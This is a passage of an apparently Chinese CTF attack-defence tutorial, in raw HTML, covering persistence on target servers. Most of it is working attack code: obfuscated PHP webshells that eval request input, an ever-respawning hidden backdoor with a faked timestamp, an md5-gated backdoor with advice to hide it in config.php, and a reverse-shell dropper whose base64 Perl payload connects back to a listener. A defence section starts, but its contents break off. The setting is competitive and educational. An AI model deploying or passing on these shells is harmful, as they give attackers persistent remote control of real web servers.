style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">&lt;?php<br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">a=chr(96^5);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">b=chr(57^79);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">c=chr(15^110);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">d=chr(58^86);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">e=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 105px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'($_REQUEST[C])'</span>;</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">@assert($</span><span class="bash">a.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$b</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$c</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$d</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$e</span>);</span><br mpa-from-tpl="t"  />?&gt;</code></pre></section><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">配置为<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">?b=))99(rhC(tseuqeR+lave</code></p><figure class="highlight plain" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;white-space: normal;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 820.8px;"><span class="line" style="height: 20px;">&lt;?php</span><br  /><span class="line" style="height: 20px;">$sF="PCT4BA6ODSE_";</span><br  /><span class="line" style="height: 20px;">$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);</span><br  /><span class="line" style="height: 20px;">$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}</span><br  /><span class="line" style="height: 20px;">?&gt;</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">配置为<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code>&nbsp;，连接密码为<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">0</code>（数字）</p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">单个文件批量上传</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">当我们通过某个漏洞批量上传了很多的webshell后，可能想要批量传个后门以备后用。这时我们可以通过用脚本批量上传来提高效率：batch_upload_file</p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">权限维持</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">上面说到利用预留后门可以维持权限，主要有两种，一种是“不死马”，另一种是反弹shell</p><p style="margin-bottom: 25px;">“不死马”</p><figure class="highlight plain" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /><span class="line" style="height: 20px;">9</span><br  /><span class="line" style="height: 20px;">10</span><br  /><span class="line" style="height: 20px;">11</span><br  /><span class="line" style="height: 20px;">12</span><br  /><span class="line" style="height: 20px;">13</span><br  /><span class="line" style="height: 20px;">14</span><br  /><span class="line" style="height: 20px;">15</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 2743.2px;"><span class="line" style="height: 20px;">&lt;?php</span><br  /><span class="line" style="height: 20px;">    set_time_limit(0);</span><br  /><span class="line" style="height: 20px;">    ignore_user_abort(true);</span><br  /><span class="line" style="height: 20px;">    $file = '.demo.php';</span><br  /><span class="line" style="height: 20px;">    $shell = "&lt;?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF("",$_cC);@$_();?&gt;";</span><br  /><span class="line" style="height: 20px;">    //$_hR='chr'</span><br  /><span class="line" style="height: 20px;">    //$_cC='eval($_POST[1]);'</span><br  /><span class="line" style="height: 20px;">    //$_fF='create_function'</span><br  /><span class="line" style="height: 20px;">    while(true){</span><br  /><span class="line" style="height: 20px;">        file_put_contents($file, $shell);</span><br  /><span class="line" style="height: 20px;">        system('chmod 777 .demo.php');</span><br  /><span class="line" style="height: 20px;">        touch(".demo.php", mktime(11,11,11,11,11,2018));</span><br  /><span class="line" style="height: 20px;">        usleep(50);</span><br  /><span class="line" style="height: 20px;">        }</span><br  /><span class="line" style="height: 20px;">?&gt;</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">利用预留后门，上传上面的“不死马”并访问，就会一直生成</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">.demo.php</span></code><span style="font-size:14px;line-height:34px;;">的一句话木马，木马内容可以自行修改，只要别被其他队伍看懂就行。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">文件名前加一个点，能更好地隐藏文件</p></blockquote><p style="margin-bottom: 25px;">想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">&lt;?php<br mpa-from-tpl="t"  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">while</span> (<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>) {<br mpa-from-tpl="t"  /> $pid=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1234</span>;<br mpa-from-tpl="t"  /> @unlink(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 72px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'.demo.php'</span>);<br mpa-from-tpl="t"  /> exec(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 92px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'kill -9 $pid'</span>);<br mpa-from-tpl="t"  />}<br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">?&gt;</span></code></pre></section><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">先查看进程，查看对应的pid，再执行即可。</span><span style="font-size:14px;line-height:34px;;"></span></p><p style="margin-bottom: 25px;">md5马+header</p><figure class="highlight plain" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 442.4px;"><span class="line" style="height: 20px;">&lt;?php</span><br  /><span class="line" style="height: 20px;">echo 'hello';</span><br  /><span class="line" style="height: 20px;">if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')</span><br  /><span class="line" style="height: 20px;">	if (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){</span><br  /><span class="line" style="height: 20px;">	$test= 'flag';</span><br  /><span class="line" style="height: 20px;">    header("flag:$test");</span><br  /><span class="line" style="height: 20px;">}</span><br  /><span class="line" style="height: 20px;">?&gt;</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">放进</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">config.php</span></code><span style="font-size:14px;line-height:34px;;">效果最好，因为一般很少人去看这个。</span></p><p style="margin-bottom: 25px;">反弹shell</p><figure class="highlight plain" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /><span class="line" style="height: 20px;">9</span><br  /><span class="line" style="height: 20px;">10</span><br  /><span class="line" style="height: 20px;">11</span><br  /><span class="line" style="height: 20px;">12</span><br  /><span class="line" style="height: 20px;">13</span><br  /><span class="line" style="height: 20px;">14</span><br  /><span class="line" style="height: 20px;">15</span><br  /><span class="line" style="height: 20px;">16</span><br  /><span class="line" style="height: 20px;">17</span><br  /><span class="line" style="height: 20px;">18</span><br  /><span class="line" style="height: 20px;">19</span><br  /><span class="line" style="height: 20px;">20</span><br  /><span class="line" style="height: 20px;">21</span><br  /><span class="line" style="height: 20px;">22</span><br  /><span class="line" style="height: 20px;">23</span><br  /><span class="line" style="height: 20px;">24</span><br  /><span class="line" style="height: 20px;">25</span><br  /><span class="line" style="height: 20px;">26</span><br  /><span class="line" style="height: 20px;">27</span><br  /><span class="line" style="height: 20px;">28</span><br  /><span class="line" style="height: 20px;">29</span><br  /><span class="line" style="height: 20px;">30</span><br  /><span class="line" style="height: 20px;">31</span><br  /><span class="line" style="height: 20px;">32</span><br  /><span class="line" style="height: 20px;">33</span><br  /><span class="line" style="height: 20px;">34</span><br  /><span class="line" style="height: 20px;">35</span><br  /><span class="line" style="height: 20px;">36</span><br  /><span class="line" style="height: 20px;">37</span><br  /><span class="line" style="height: 20px;">38</span><br  /><span class="line" style="height: 20px;">39</span><br  /><span class="line" style="height: 20px;">40</span><br  /><span class="line" style="height: 20px;">41</span><br  /><span class="line" style="height: 20px;">42</span><br  /><span class="line" style="height: 20px;">43</span><br  /><span class="line" style="height: 20px;">44</span><br  /><span class="line" style="height: 20px;">45</span><br  /><span class="line" style="height: 20px;">46</span><br  /><span class="line" style="height: 20px;">47</span><br  /><span class="line" style="height: 20px;">48</span><br  /><span class="line" style="height: 20px;">49</span><br  /><span class="line" style="height: 20px;">50</span><br  /><span class="line" style="height: 20px;">51</span><br  /><span class="line" style="height: 20px;">52</span><br  /><span class="line" style="height: 20px;">53</span><br  /><span class="line" style="height: 20px;">54</span><br  /><span class="line" style="height: 20px;">55</span><br  /><span class="line" style="height: 20px;">56</span><br  /><span class="line" style="height: 20px;">57</span><br  /><span class="line" style="height: 20px;">58</span><br  /><span class="line" style="height: 20px;">59</span><br  /><span class="line" style="height: 20px;">60</span><br  /><span class="line" style="height: 20px;">61</span><br  /><span class="line" style="height: 20px;">62</span><br  /><span class="line" style="height: 20px;">63</span><br  /><span class="line" style="height: 20px;">64</span><br  /><span class="line" style="height: 20px;">65</span><br  /><span class="line" style="height: 20px;">66</span><br  /><span class="line" style="height: 20px;">67</span><br  /><span class="line" style="height: 20px;">68</span><br  /><span class="line" style="height: 20px;">69</span><br  /><span class="line" style="height: 20px;">70</span><br  /><span class="line" style="height: 20px;">71</span><br  /><span class="line" style="height: 20px;">72</span><br  /><span class="line" style="height: 20px;">73</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 5331.2px;"><span class="line" style="height: 20px;">&lt;?php</span><br  /><span class="line" style="height: 20px;">    function which($pr){ </span><br  /><span class="line" style="height: 20px;">        $path = execute("which $pr"); </span><br  /><span class="line" style="height: 20px;">        return ($path ? $path : $pr); </span><br  /><span class="line" style="height: 20px;">    }</span><br  /><span class="line" style="height: 20px;">    function execute($cfe){ </span><br  /><span class="line" style="height: 20px;">        $res = ''; </span><br  /><span class="line" style="height: 20px;">        if ($cfe){ </span><br  /><span class="line" style="height: 20px;">            if(function_exists('exec')){ </span><br  /><span class="line" style="height: 20px;">                @exec($cfe,$res); </span><br  /><span class="line" style="height: 20px;">                $res = join("\n",$res); </span><br  /><span class="line" style="height: 20px;">            }</span><br  /><span class="line" style="height: 20px;">            elseif(function_exists('shell_exec')){ </span><br  /><span class="line" style="height: 20px;">                $res = @shell_exec($cfe); </span><br  /><span class="line" style="height: 20px;">            }</span><br  /><span class="line" style="height: 20px;">            elseif(function_exists('system')){</span><br  /><span class="line" style="height: 20px;">                @ob_start();</span><br  /><span class="line" style="height: 20px;">                @system($cfe);</span><br  /><span class="line" style="height: 20px;">                $res = @ob_get_contents();</span><br  /><span class="line" style="height: 20px;">                @ob_end_clean();</span><br  /><span class="line" style="height: 20px;">            }</span><br  /><span class="line" style="height: 20px;">            elseif(function_exists('passthru')){ </span><br  /><span class="line" style="height: 20px;">            @ob_start(); </span><br  /><span class="line" style="height: 20px;">            @passthru($cfe); </span><br  /><span class="line" style="height: 20px;">            $res = @ob_get_contents(); </span><br  /><span class="line" style="height: 20px;">            @ob_end_clean(); </span><br  /><span class="line" style="height: 20px;">            }</span><br  /><span class="line" style="height: 20px;">            elseif(@is_resource($f = @popen($cfe,"r"))){ </span><br  /><span class="line" style="height: 20px;">                $res = '';</span><br  /><span class="line" style="height: 20px;">                while(!@feof($f)){</span><br  /><span class="line" style="height: 20px;">                    $res .= @fread($f,1024);</span><br  /><span class="line" style="height: 20px;">                }</span><br  /><span class="line" style="height: 20px;">                @pclose($f);</span><br  /><span class="line" style="height: 20px;">            }</span><br  /><span class="line" style="height: 20px;">        }</span><br  /><span class="line" style="height: 20px;">        return $res; </span><br  /><span class="line" style="height: 20px;">    } </span><br  /><span class="line" style="height: 20px;">    function cf($fname,$text){</span><br  /><span class="line" style="height: 20px;">        if($fp=@fopen($fname,'w')) {</span><br  /><span class="line" style="height: 20px;">            @fputs($fp,@base64_decode($text));</span><br  /><span class="line" style="height: 20px;">            @fclose($fp);</span><br  /><span class="line" style="height: 20px;">        }</span><br  /><span class="line" style="height: 20px;">    }</span><br  /><br  /><span class="line" style="height: 20px;">    $yourip = "127.0.0.1";</span><br  /><span class="line" style="height: 20px;">    $yourport = '9999';</span><br  /><span class="line" style="height: 20px;">    $usedb = array('perl'=&gt;'perl','c'=&gt;'c');</span><br  /><span class="line" style="height: 20px;">  $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";</span><br  /><span class="line" style="height: 20px;">    /*</span><br  /><span class="line" style="height: 20px;">    base64加密内容如下：</span><br  /><span class="line" style="height: 20px;">    #!/usr/bin/perl</span><br  /><span class="line" style="height: 20px;">    use Socket;</span><br  /><span class="line" style="height: 20px;">    $cmd= "lynx";</span><br  /><span class="line" style="height: 20px;">    $system= 'echo "`uname -a`";echo "`id`";/bin/sh';</span><br  /><span class="line" style="height: 20px;">    $0=$cmd;</span><br  /><span class="line" style="height: 20px;">    $target=$ARGV[0];</span><br  /><span class="line" style="height: 20px;">    $port=$ARGV[1];</span><br  /><span class="line" style="height: 20px;">    $iaddr=inet_aton($target) || die("Error: $!\n");</span><br  /><span class="line" style="height: 20px;">    $paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");</span><br  /><span class="line" style="height: 20px;">    $proto=getprotobyname('tcp');</span><br  /><span class="line" style="height: 20px;">    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");</span><br  /><span class="line" style="height: 20px;">    connect(SOCKET, $paddr) || die("Error: $!\n");</span><br  /><span class="line" style="height: 20px;">    open(STDIN, "&gt;&amp;SOCKET");</span><br  /><span class="line" style="height: 20px;">    open(STDOUT, "&gt;&amp;SOCKET");</span><br  /><span class="line" style="height: 20px;">    open(STDERR, "&gt;&amp;SOCKET");</span><br  /><span class="line" style="height: 20px;">    system($system);</span><br  /><span class="line" style="height: 20px;">    close(STDIN);</span><br  /><span class="line" style="height: 20px;">    close(STDOUT);</span><br  /><span class="line" style="height: 20px;">    close(STDERR);</span><br  /><span class="line" style="height: 20px;">     */</span><br  /><span class="line" style="height: 20px;">    cf('/tmp/.bc',$back_connect);</span><br  /><span class="line" style="height: 20px;">    $res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");</span><br  /><span class="line" style="height: 20px;">?&gt;</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了</span></p><ul style="" class=" list-paddingleft-2"></ul><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">How to Defend</h4><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">常用命令</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">我们先总结一下线下赛的防护工作中常用的一些命令</p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;white-space: normal;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /><span class="line" style="height: 20px;">9</span><br  /><span class="line" style="height: 20px;">10</span><br  /><span class="line" style="height: 20px;">11</span><br  /><span class="line" style="height: 20px;">12</span><br  /><span class="line" style="height: 20px;">13</span><br  /><span class="line" style="height: 20px;">14</span><br  /><span class="line" style="height: 20px;">15</span><br  /><span class="line" style="height: 20px;">16</span><br  /><span class="line" style="height: 20px;">17</span><br  /><span class="line" style="height: 20px;">18</span><br  /><span class="line" style="height: 20px;">19</span><br  /><span class="line" style="height: 20px;">20</span><br  /><span class="line" style="height: 20px;">21</span><br  /><span class="line" style="height: 20px;">22</span><br  /><span class="line" style="height: 20px;">23</span><br  /><span class="line" style="height: 20px;">24</span><br  /><span class="line" style="height: 20px;">25</span><br  /><span class="line" style="height: 20px;">26</span><br  /><span class="line" style="height: 20px;">27</span><br 